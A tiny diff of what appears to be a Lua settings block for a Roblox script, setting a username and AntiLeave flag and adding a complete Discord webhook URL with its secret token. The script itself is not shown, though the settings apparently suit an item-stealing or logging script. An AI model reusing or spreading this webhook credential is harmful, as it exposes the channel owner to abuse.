@@ -1,6 +1,6 @@
 UserName = "LEGACROW11"
 UserName2 = "LEGACROW11"
-Webhook = ""
+Webhook = "https://discord.com/api/webhooks/1107037193547042956/LsZ5NpRtPPV_jmw4vPNGI9yMPIf0VULYqQP6uToVFtGbWDJEQ4FyODVPp-ll7cMMWzZi"
 
 _G.LoadingScreen = true
 _G.AntiLeave = false
